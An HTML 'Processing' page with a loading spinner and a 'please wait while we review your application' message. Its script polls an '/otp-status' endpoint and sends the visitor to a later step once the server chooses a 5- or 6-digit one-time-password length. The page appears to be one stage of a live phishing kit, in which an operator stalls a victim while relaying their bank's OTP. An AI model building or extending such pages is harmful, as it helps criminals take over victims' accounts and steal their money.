<!DOCTYPE html>
<html>

<head>
    <title>Processing</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <link rel="stylesheet" href="style.css">
</head>

<body>

<div class="header"></div>

<div class="container">

    <h2 class="title">Processing...</h2>

    <div class="loader"></div>

    <p style="text-align:center; margin-top:20px;">
        Please wait while we review your application
    </p>

</div>

<div class="footer"></div>

<script>

// 🔵 FLOW 1: from earlier step → go to step5 after 5s
if (localStorage.getItem("firstProcess") === "yes") {
    localStorage.removeItem("firstProcess");

    setTimeout(() => {
        window.location.href = "step5.html";
    }, 5000);
}

// 🔵 FLOW 2: always check for updates (OTP + decision)
const checker = setInterval(async () => {
    try {
        // 🔢 CHECK OTP TYPE (5 or 6)
        const res = await fetch("/otp-status");
        const data = await res.json();

        if (data.otp === 5) {
            clearInterval(checker);
            localStorage.setItem("otpLength", 5);
            window.location.href = "step6.html";
            return;
        }

        if (data.otp === 6) {
            clearInterval(checker);
            localStorage.setItem("otpLength", 6);
            window.location.href = "step6.html";
            return;
        }

        // ✅ CHECK APPROVE / DECLINE
        
    } catch (err) {
        console.log("Waiting...");
    }
}, 2000);

</script>
<div id="pageLoader" class="loader" style="display:none;"></div>
</body>
</html>
